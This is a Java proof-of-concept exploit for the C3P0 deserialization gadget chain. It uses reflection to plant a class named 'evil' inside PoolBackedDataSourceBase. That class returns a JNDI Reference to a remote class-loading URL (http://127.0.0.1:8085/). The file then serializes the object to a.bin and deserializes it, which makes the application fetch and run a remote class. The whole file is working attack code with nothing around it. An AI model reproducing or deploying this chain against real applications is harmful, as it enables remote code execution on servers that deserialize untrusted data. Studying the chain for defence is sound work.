package C3P0;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class c3p {
    public static void main(String[] args) throws Exception {
        PoolBackedDataSourceBase a = new PoolBackedDataSourceBase(false);
        Class clazz = Class.forName("com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
        Field f1 = clazz.getDeclaredField("connectionPoolDataSource"); //此类是PoolBackedDataSourceBase抽象类的实现
        f1.setAccessible(true);
        f1.set(a, new evil());

        ObjectOutputStream ser = new ObjectOutputStream(new FileOutputStream(new File("a.bin")));
        ser.writeObject(a);
        ser.close();
        ObjectInputStream unser = new ObjectInputStream(new FileInputStream("a.bin"));
        unser.readObject();
        unser.close();
    }

    public static class evil implements ConnectionPoolDataSource, Referenceable {


        @Override
        public Reference getReference() throws NamingException {
            return new Reference("CBLNaQal", "CBLNaQal", "http://127.0.0.1:8085/");
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }
}